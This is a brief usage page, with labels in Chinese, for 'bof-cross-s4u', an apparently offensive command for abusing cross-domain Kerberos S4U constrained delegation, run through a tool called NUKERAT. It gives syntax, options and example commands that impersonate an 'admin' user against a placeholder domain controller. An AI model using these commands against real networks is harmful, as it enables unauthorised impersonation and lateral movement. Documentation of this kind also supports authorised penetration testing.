关于
    Perform cross domain S4U constrained delegation abuse.
用法：
    bof-cross-s4u --- /ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/nopac] [/self]

示例：
    bof-cross-s4u --- /ticket:BASE64 /service:cifs/target /targetdomain:other.corp /targetdc:dc2.other.corp /impersonateuser:admin

NUKERAT 选项：
    -w <秒数>       等待超时的最大时间
    -bg             后台运行，不等待输出

    示例：
    bof-cross-s4u -w 60 --- /ticket:BASE64 /service:cifs/target /targetdomain:other.corp /targetdc:dc2.other.corp /impersonateuser:admin
